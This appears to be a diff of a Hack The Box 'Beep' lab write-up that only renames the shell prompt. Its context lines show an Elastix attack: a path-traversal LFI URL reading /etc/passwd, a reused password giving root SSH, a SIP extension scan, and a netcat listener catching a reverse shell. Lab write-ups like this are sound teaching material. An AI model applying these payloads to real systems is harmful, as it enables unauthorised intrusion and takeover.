@@ -84,7 +84,7 @@ PORT      STATE SERVICE    VERSION
 
 let do searchsploit for Elastix
 ```console
-kali@kali:/opt$ searchsploit Elastix
+bibo318@parrot:/opt$ searchsploit Elastix
 Elastix 2.2.0 - 'graph.php' Local File Inclusion                | php/webapps/37637.pl
 Elastix 2.x - Blind SQL Injection                               | php/webapps/36305.txt
 Elastix < 2.5 - PHP Code Injection                              | php/webapps/38091.php
@@ -114,9 +114,9 @@ yep we got admin credential `admin:jEhdIekWmdjE`. let log into `Elastix`, ofc it
 seem like `jEhdIekWmdjE` is used repeatedly. I wonder if it use somewhere else such as password for ssh.
 I vist `/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action` to see all users in the server. the user with login will have `/bin/bash` ash there home dir.
 ```console
-[10.10.14.43]-kali@kali:~/HTB/beep$ nano users.txt
-[10.10.14.43]-kali@kali:~/HTB/beep$ grep 'bin/bash' users.txt >> userwithlogin.txt
-[10.10.14.43]-kali@kali:~/HTB/beep$ cat userwithlogin.txt 
+[10.10.14.43]-bibo318@parrot:~/HTB/beep$ nano users.txt
+[10.10.14.43]-bibo318@parrot:~/HTB/beep$ grep 'bin/bash' users.txt >> userwithlogin.txt
+[10.10.14.43]-bibo318@parrot:~/HTB/beep$ cat userwithlogin.txt 
 root:x:0:0:root:/root:/bin/bash
 mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
 cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash
@@ -126,12 +126,12 @@ fanis:x:501:501::/home/fanis:/bin/bash
 ```
 So let try too ssh to server as root
 ```console
-[10.10.14.43]-kali@kali:/opt$ ssh root@beep.htb
+[10.10.14.43]-bibo318@parrot:/opt$ ssh root@beep.htb
 Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
 ```
 okey let google the error, read this [stackexchange](https://unix.stackexchange.com/questions/402746/ssh-unable-to-negotiate-no-matching-key-exchange-method-found). now try again as `root:jEhdIekWmdjE`
 ```
-[10.10.14.43]-kali@kali:/opt$ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c 3des-cbc root@beep.htb
+[10.10.14.43]-bibo318@parrot:/opt$ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c 3des-cbc root@beep.htb
 The authenticity of host 'beep.htb (10.10.10.7)' can't be established.
 RSA key fingerprint is SHA256:Ip2MswIVDX1AIEPoLiHsMFfdg1pEJ0XXD5nFEjki/hI.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
@@ -161,7 +161,7 @@ seem like the extention is not working. After some googleing, I found out that w
 
 we can use `svwar.py - SIPvicious extension line scanner`
 ```console
-[10.10.14.43]-kali@kali:/opt/sipvicious$ sipvicious_svwar -m INVITE -e1-1000 10.10.10.7
+[10.10.14.43]-bibo318@parrot:/opt/sipvicious$ sipvicious_svwar -m INVITE -e1-1000 10.10.10.7
 WARNING:TakeASip:using an INVITE scan on an endpoint (i.e. SIP phone) may cause it to ring and wake up people in the middle of the night
 +-----------+----------------+
 | Extension | Authentication |
@@ -176,7 +176,7 @@ https://10.10.10.7/recordings/misc/callme_page.php?action=c&callmenum=233@from-i
 ```
 open nc listen and visit the ablow site
 ```console
-10.10.14.43]-kali@kali:~/HTB/popcorn$ nc -nlvp 6969
+10.10.14.43]-bibo318@parrot:~/HTB/popcorn$ nc -nlvp 6969
 listening on [any] 6969 ...
 connect to [10.10.14.43] from (UNKNOWN) [10.10.10.7] 55522
 whoami
